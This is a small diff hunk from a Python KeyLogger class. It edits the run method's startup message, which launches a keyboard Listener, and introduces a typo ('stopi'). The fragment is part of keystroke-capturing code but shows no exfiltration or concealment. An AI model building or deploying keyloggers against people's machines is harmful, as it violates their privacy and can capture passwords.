@@ -75,7 +75,7 @@ class KeyLogger:
             self.words_buffer = []
 
     def run(self):
-        print("Keylogger started. Press ESC to stop.")
+        print("Keylogger started. Press ESC to stopi.")
         with Listener(on_press=self.on_press) as listener:
             listener.join()
 
